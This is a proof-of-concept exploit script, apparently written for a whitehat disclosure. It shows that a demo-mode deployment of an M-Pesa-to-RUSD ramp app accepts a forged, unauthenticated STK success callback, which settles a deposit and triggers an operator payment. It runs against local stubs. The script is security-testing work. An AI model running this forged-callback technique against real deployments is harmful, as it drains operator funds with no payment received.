// F3 — DEMO_MODE silently opens the ramp M-Pesa callback endpoint.
// rampRoutes.js:84: `if (config.demoMode && !config.ramp.callbackToken) return true`
// Combined with daraja.js demo STK (queryStkPushStatus returns ResultCode 0 for ANY
// checkout id), a demo-mode deployment lets anyone POST a forged
// /api/ramp/callback/stk to settle a deposit order:
//   confirmDepositMpesa -> settleDeposit -> operator send_payment on the REAL node
//   -> RUSD leaves the operator channel with zero M-Pesa money.
//
// The ramp callback token guard is *supposed* to be the authentication boundary for the
// operator pilot; demo mode removes it. This is the config foot-gun: the same code that
// is "safe" with RAMP_CALLBACK_TOKEN set is wide open when DEMO_MODE=true and the token
// is empty (the .env.example default for local dev, and what a reviewer/demo deploy ships).
//
// PoC boots the unmodified target with DEMO_MODE=true, scratch DB, FNN stubs, creates a
// deposit order through the app API, then POSTs the forged ramp callback and asserts the
// order advances past mpesa_pending with an operator send_payment recorded.
import { spawn } from 'node:child_process'
import { startFnnStub, startChannelStub } from './fnnstub.mjs'
import { pg } from './deps.mjs'
import { ensureScratchDb } from './dbsetup.mjs'

const REPO = '/tmp/ckb-whitehat/dular2/repo'
const PORT = 8792
const STUB_OP = 8447
const STUB_RX = 8457
const { Client } = pg

const dbUrl = await ensureScratchDb()
const payments = []
const stub = await startFnnStub({ port: STUB_OP, payments })
const stubRx = await startFnnStub({ port: STUB_RX, payments })

const env = {
  ...process.env,
  DEMO_MODE: 'true',
  OTP_DEMO_MODE: 'true',
  DATABASE_URL: dbUrl,
  SESSION_SECRET: 'whitehat',
  API_PORT: String(PORT),
  PUBLIC_BASE_URL: `http://127.0.0.1:${PORT}`,
  FIBER_RPC_URL: `http://127.0.0.1:${STUB_OP}`,
  FIBER_RECEIVER_RPC_URL: `http://127.0.0.1:${STUB_RX}`,
  CKB_TESTNET_RPC_URL: 'http://127.0.0.1:1',
  RAMP_CALLBACK_TOKEN: '',
  RAMP_OPERATOR_TOKEN: '',
}
const app = spawn('node', ['server/index.js'], { cwd: REPO, env, stdio: ['ignore', 'pipe', 'pipe'] })
let appLog = ''
app.stdout.on('data', d => { appLog += d })
app.stderr.on('data', d => { appLog += d })
await new Promise((resolve, reject) => {
  const t = setTimeout(() => reject(new Error('app did not start: ' + appLog.slice(-400))), 10000)
  app.stdout.on('data', d => { if (String(d).includes('Dular API listening')) { clearTimeout(t); resolve() } })
})
console.log(`[setup] target on :${PORT} DEMO_MODE=true RAMP_CALLBACK_TOKEN='' (operator FNN is a stub)`)

const base = `http://127.0.0.1:${PORT}`
const j = (p, b, token, method = 'POST', extra = {}) => fetch(base + p, { method, headers: { 'content-type': 'application/json', ...(token ? { authorization: `Bearer ${token}` } : {}), ...extra }, body: b ? JSON.stringify(b) : undefined }).then(async r => ({ status: r.status, body: await r.json().catch(() => null) }))

// user
await j('/api/auth/request-otp', { phone: '0700000003' })
const v = await j('/api/auth/verify-otp', { phone: '0700000003', code: '123456' })
const token = v.body?.token
if (!token) throw new Error('auth failed: ' + JSON.stringify(v.body))

// bind a fiber wallet via the DB (PoC convenience) and give the stub a ready RUSD channel
const db = new Client({ connectionString: dbUrl }); await db.connect()
const { rows: [user] } = await db.query(`SELECT id FROM users WHERE phone IN ('0700000003','+254700000003')`)
const PUBKEY = '11'.repeat(33)
const LOCKARG = '22'.repeat(20)
await db.query(`UPDATE users SET fiber_pubkey=$2, ckb_lock_arg=$3 WHERE id=$1`, [user.id, PUBKEY, LOCKARG])
startChannelStub(stub, PUBKEY, 5_000_000_000n) // 50 RUSD ready channel so requireDepositRoute passes

// deposit quote + order through the app API
const quote = await j('/api/ramp/quotes', { direction: 'deposit', kesAmount: 100 }, token)
if (quote.status !== 200) throw new Error('quote failed: ' + JSON.stringify(quote.body))
const orderResp = await fetch(`${base}/api/ramp/deposits`, {
  method: 'POST', headers: { 'content-type': 'application/json', authorization: `Bearer ${token}`, 'idempotency-key': 'whitehat-dep-0001' },
  body: JSON.stringify({ quoteId: quote.body.quote.id }),
})
const order2 = await orderResp.json()
const orderId = order2.order?.id
if (!orderId) throw new Error('order failed: ' + JSON.stringify(order2))
console.log(`[setup] order=${orderId} state=${order2.order?.state}`)

// attach a browser invoice (required to advance the order; stub parse_invoice succeeds)
await j(`/api/ramp/deposits/${orderId}/invoice`, {}, token).catch(() => {})
// STK via the app (demo, no vendor) -> order mpesa_pending with a demo checkout_request_id
await j(`/api/ramp/deposits/${orderId}/stk`, {}, token)
const { rows: [oRow] } = await db.query(`SELECT status, checkout_request_id FROM ramp_orders WHERE id=$1`, [orderId])
console.log(`[setup] after /stk: status=${oRow.status} checkout=${oRow.checkout_request_id}`)

// ---- THE ATTACK: forged ramp callback, no Daraja, no callback token needed in demo mode
const forged = await j('/api/ramp/callback/stk', {
  stkCallback: {
    CheckoutRequestID: oRow.checkout_request_id, ResultCode: 0, ResultDesc: 'Success',
    CallbackMetadata: { Item: [
      { Name: 'Amount', Value: '100' },
      { Name: 'MpesaReceiptNumber', Value: 'RAMP-FORGED-001' },
      { Name: 'PhoneNumber', Value: '254700000003' },
    ] },
  },
})
console.log(`[attack] forged ramp callback -> HTTP ${forged.status}`)
await new Promise(r => setTimeout(r, 5000))

const { rows: [final] } = await db.query(`SELECT status, fiber_status, fiber_payment_hash FROM ramp_orders WHERE id=$1`, [orderId])
await db.end()
const sendCalls = stub.served.filter(s => s.method === 'send_payment').length
console.log(`[state] order ${oRow.status} -> ${final.status} (fiber=${final.fiber_status} hash=${final.fiber_payment_hash})`)
console.log(`[stub] operator send_payment calls=${sendCalls}`)
const fired = ['completed', 'fiber_sending', 'delivery_pending'].includes(final.status) && final.fiber_payment_hash
if (fired) console.log('F3 FIRED — demo-mode ramp callback accepted a forged M-Pesa success and advanced the order, triggering an operator send_payment.')
else console.log('F3 check: final=' + final.status)

app.kill()
await new Promise(r => setTimeout(r, 300))
stub.close(); stubRx.close()
process.exit(0)
